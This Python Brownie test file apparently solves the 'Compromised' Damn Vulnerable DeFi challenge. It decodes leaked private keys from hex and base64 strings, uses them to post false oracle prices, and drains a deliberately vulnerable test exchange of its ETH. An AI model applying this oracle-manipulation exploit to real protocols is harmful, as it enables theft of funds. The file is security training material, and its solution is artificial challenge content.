from brownie import (
    accounts,
    Exchange,
    DamnValuableNFT,
    TrustfulOracle,
    TrustfulOracleInitializer,
)
from brownie.network.account import Account
from brownie.network.contract import Contract
from web3.providers import base
import base64


def test_compromised():
    sources = [
        "0xA73209FB1a42495120166736362A1DfA9F95A105",
        "0xe92401A4d3af5E446d93D11EEc806b1462b39D15",
        "0x81A5D6E50C214044bE44cA0CB057fe119097850c",
    ]
    deployer: Account = accounts[0]
    attacker: Account = accounts[1]
    EXCHANGE_INITIAL_ETH_BALANCE = 10000e18
    INITIAL_NFT_PRICE = 999e18
    deployer.transfer(sources[0], 5e18).wait(1)
    deployer.transfer(sources[1], 5e18).wait(1)
    deployer.transfer(sources[2], 5e18).wait(1)

    oracleInitializer = TrustfulOracleInitializer.deploy(
        sources,
        ["DVNFT", "DVNFT", "DVNFT"],
        [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE],
        {"from": deployer},
    )
    oracle = Contract.from_abi(
        "TrustfulOracle", oracleInitializer.oracle(), TrustfulOracle.abi
    )
    exchange = Exchange.deploy(
        oracle.address, {"from": deployer, "amount": EXCHANGE_INITIAL_ETH_BALANCE}
    )
    assert exchange.balance() == EXCHANGE_INITIAL_ETH_BALANCE
    token = Contract.from_abi("DamnValuableNFT", exchange.token(), DamnValuableNFT.abi)

    # YOUR EXPLOIT GOES HERE
    exchange.buyOne({"from": attacker, "amount": INITIAL_NFT_PRICE})

    LEAK_1 = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35"
    LEAK_2 = "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34"

    def leak2account(leak):
        encoded = "".join(chr(int(i, base=16)) for i in leak.split(" "))
        private_key = base64.b64decode(encoded)
        return accounts.add(private_key.decode())

    leak1 = leak2account(LEAK_1)
    leak2 = leak2account(LEAK_2)

    exchangeBalance = exchange.balance()
    oracle.postPrice("DVNFT", exchangeBalance, {"from": leak1})
    oracle.postPrice("DVNFT", exchangeBalance + 1, {"from": leak2})

    tokenId = token.tokenOfOwnerByIndex(attacker.address, 0)
    token.approve(exchange.address, tokenId, {"from": attacker})
    exchange.sellOne(tokenId, {"from": attacker})

    # Exchange must have lost all ETH
    assert exchange.balance() == 0
    assert attacker.balance() > EXCHANGE_INITIAL_ETH_BALANCE
